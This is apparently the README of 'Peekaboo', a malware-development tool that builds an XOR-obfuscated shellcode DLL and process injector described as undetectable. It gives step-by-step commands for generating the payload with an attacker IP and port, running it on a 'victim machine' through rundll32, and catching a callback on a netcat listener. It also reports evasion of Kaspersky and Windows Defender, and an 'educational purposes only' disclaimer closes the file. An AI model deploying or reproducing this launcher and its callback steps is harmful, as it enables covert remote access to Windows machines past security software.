# Peekaboo

Simple undetectable shellcode and code injector launcher example. Inspired by RTO malware development course.

## Main logic

XOR encryption and decryption for functions call and main payload - `calc.exe` as example.

## Usage
## 1. DLL
### on attacker machine

check your IP:
```bash
ip a
```

![attacker machine IP](./screenshots/1.png?raw=true)

run python script with flags:
```bash
python3 peekaboo.py -l 10.9.1.6 -p 4444
```

![run python script](./screenshots/2.png?raw=true)

### then on victim machine (windows x64):
run on powershell or cmd promt:
```cmd
rundll32 .\peekaboo.dll, BMzUWjfJOsdaiCQzbTLM
```

![run on victim machine](./screenshots/3.png?raw=true)

### check on attacker machine:
check your netcat listener:

![check netcat listener](./screenshots/4.png?raw=true)

example:
![final](./screenshots/5.png?raw=true)

## 2.Injector
### on attacker machine:
run python script on linux:
```bash
python3 peekaboo-inj.py -l 10.10.14.3 -p 4444
```

compile in VS - windows machine x64:
```cmd
.\compile-inj.bat
```

### then on victim machine (windows x64):
```
.\peekaboo.exe
```

## Issues.
Tested on:
1. Attacker machines: Kali linux 2020.1, Windows 10 x64
2. Victim machine: Windows 10 x64
3. Payload: Calc.exe
4. AV Engines: Kaspersky, Windows Defender

## TODO
Compile injector in Kali linux

## Attention
This tool is a Proof of Concept and is for Educational Purposes Only!!! Author takes no responsibility of any damage you cause

## License
[MIT](https://choosealicense.com/licenses/mit/)
